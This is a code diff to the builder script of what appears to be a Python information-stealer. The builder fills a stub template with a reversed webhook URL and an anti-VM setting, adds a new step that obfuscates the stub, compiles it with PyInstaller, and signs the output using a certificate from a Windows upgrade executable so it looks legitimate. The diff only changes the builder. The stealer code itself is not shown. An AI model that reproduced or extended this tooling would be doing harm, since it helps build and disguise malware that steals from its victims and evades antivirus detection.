@@ -28,14 +28,16 @@ class Build:
                 else:
                     iconPath == getIconPath
             if self.useIcon == True:
-                self.pyinstallerCommand += f"--icon={getIconPath} stub.py"
-            else:self.pyinstallerCommand += "stub.py"
+                self.pyinstallerCommand += f"--icon={getIconPath} quicaxd.py"
+            else:self.pyinstallerCommand += "quicaxd.py"
             with open("Exela.py", "r", encoding="utf-8", errors="ignore") as f:
                 readedCode = f.read()
             replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1]).replace('%AnTiVm%', self.antivmorospusu)
             
             with open("stub.py", "w", encoding="utf-8", errors="ignore") as x:
                 x.write(replacedCode)
+            self.obfuscateFile()
+            time.sleep(1)
             os.system(self.pyinstallerCommand)
         except:
             os.system('cls')
@@ -46,7 +48,14 @@ class Build:
             os.system('cls')
             print("Your File compiled was succesfully")
             time.sleep(1)
-            self.singFile("Windows10Upgrade9252.exe", os.getcwd() + "\\dist\\stub.exe", "Exela.exe")
+            self.singFile("Windows10Upgrade9252.exe", os.getcwd() + "\\dist\\quicaxd.exe", "quicaxd.exe")
+     
+    def obfuscateFile(self):
+        os.system("cls")
+        print("Obfuscating file pls wait")
+        time.sleep(1)
+        command = "python obfuscation.py -o quicaxd.py stub.py"
+        os.system(command)
             
     def moduleInstaller(self):
         try:
@@ -87,8 +96,9 @@ class Build:
             self.clearJunkFiles()
     def clearJunkFiles(self):
         try:
+            os.remove('quicaxd.py')
+            os.remove('quicaxd.spec')
             os.remove('stub.py')
-            os.remove('stub.spec')
             shutil.rmtree('build')
             shutil.rmtree('dist')
         except Exception as e:
